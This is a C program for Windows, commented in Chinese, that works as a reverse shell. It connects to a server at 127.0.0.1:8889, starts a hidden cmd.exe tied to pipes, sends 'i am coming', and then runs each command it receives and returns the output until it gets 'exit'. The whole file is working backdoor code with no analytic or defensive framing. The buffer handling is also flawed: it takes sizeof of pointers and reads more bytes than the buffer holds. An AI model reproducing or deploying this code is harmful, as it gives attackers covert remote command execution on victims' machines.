#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <winsock2.h>
#pragma comment(lib,"ws2_32.lib")

//定义一个线程函数
//线程函数，用来处理单独客户端的消息


HANDLE pA[2];
HANDLE pB[2];
PROCESS_INFORMATION pi = { 0 };

void run1()
{
	SECURITY_ATTRIBUTES sa1 = { 0 };
	SECURITY_ATTRIBUTES sa2 = { 0 };
	STARTUPINFO          si = { 0 };


	sa1.nLength = sizeof(sa1);
	sa1.lpSecurityDescriptor = NULL;
	sa1.bInheritHandle = TRUE;

	sa2.nLength = sizeof(sa2);
	sa2.lpSecurityDescriptor = NULL;
	sa2.bInheritHandle = TRUE;

	/*
	1W-> A ->R0
	(father)	 				(son)
	0R<- B <-W1
	*/

	CreatePipe(&pA[0], &pA[1], &sa1, 0);
	CreatePipe(&pB[0], &pB[1], &sa2, 0);
	GetStartupInfo(&si);
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags |= STARTF_USESTDHANDLES;
	si.hStdInput = pA[0];
	si.hStdOutput = si.hStdError = pB[1];
	si.dwFillAttribute = 1000;


	if (!CreateProcess(
		"c:\\Windows\\System32\\cmd.exe",
		NULL, NULL, NULL, TRUE,
		CREATE_NO_WINDOW,
		NULL, NULL,
		&si, &pi)){
		printf("CreateProcess Error!\n");
	}


	//关闭 双管道通信不需要使用的句柄
	CloseHandle(pA[0]);
	CloseHandle(pB[1]);


	return;
}
int run2(char* input_data, char* output_data){

 

	char* output_data2 = output_data;
	DWORD dwByteWritten;
	DWORD dwByteRead;
	DWORD TotalBytesAvail;
	int cntLen = 0;
 

	strcat(input_data, "\r\n");
	WriteFile(pA[1], input_data, strlen(input_data), &dwByteWritten, 0);


	while (1)
	{
		//FlushFileBuffers(B_W);
		FlushFileBuffers(pB[0]);
		FlushFileBuffers(pA[1]);
		//FlushFileBuffers(A_R);
		if (PeekNamedPipe(pB[0], output_data, sizeof(output_data), &dwByteRead, &TotalBytesAvail, NULL))
		{
			if (TotalBytesAvail > 0)
			{
				memset(output_data, 0, sizeof(output_data));
				ReadFile(pB[0], output_data, TotalBytesAvail + 100, &dwByteRead, NULL);
				// 发送数据
				//printf("%s", output_data);
				output_data = output_data + dwByteRead;
				cntLen += dwByteRead;

			}
			else{
				break;
			}
		}
		Sleep(1000); // 延时等待，避免过多的CPU占用
	}

	return cntLen;
}

void run3(){
	CloseHandle(pA[1]);
	CloseHandle(pB[0]);

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}

 
int main()
{
	//定义需要的变量
	int err = 0;
	WSADATA wsaData;
	SOCKADDR_IN addrServer;
	SOCKET sockClient;

	//准备环境
	err = WSAStartup(MAKEWORD(2, 2), &wsaData);

	if (err != 0) {
		return -1;
	}

	//创建一个电话
	sockClient = socket(AF_INET, SOCK_STREAM, 0);

	//准备拨打的电话号码
	addrServer.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");    //对方的IP地址，需要使用inet_addr函数将传入的点分十进制的IP地址转换成适合u_long型数值
	addrServer.sin_family = AF_INET;                             //指定协议类型
	addrServer.sin_port = htons(8889);                           //指定端口

	//拨打电话
	if (SOCKET_ERROR == connect(sockClient, (SOCKADDR*)&addrServer, sizeof(SOCKADDR))) {
		//printf("connect error!\n");
		return -1;
	}
	run1();
	//printf("#> connect server yes\n");

	char* sendbuf = malloc(4096); 
	char* recvbuf = malloc(4096);
	memset(sendbuf, 0, 4096);
	strcpy(sendbuf, "i am coming\n");
	DWORD sendLen=strlen(sendbuf);
	send(sockClient, sendbuf, sendLen, 0);
	while (1)
	{
		memset(recvbuf, 0, 4096);
		recv(sockClient, recvbuf, 4096, 0);
		if (strcmp(recvbuf, "exit") == 0){
			// 关闭连接的发送部分
			shutdown(sockClient, SD_SEND);
			break;
		}
		memset(sendbuf, 0, 4096);
		sendLen=run2(recvbuf, sendbuf);
		send(sockClient, sendbuf, sendLen, 0);
	}

	run3();
	free(recvbuf);
	free(sendbuf);

	closesocket(sockClient);
	WSACleanup();

	return 0;
}

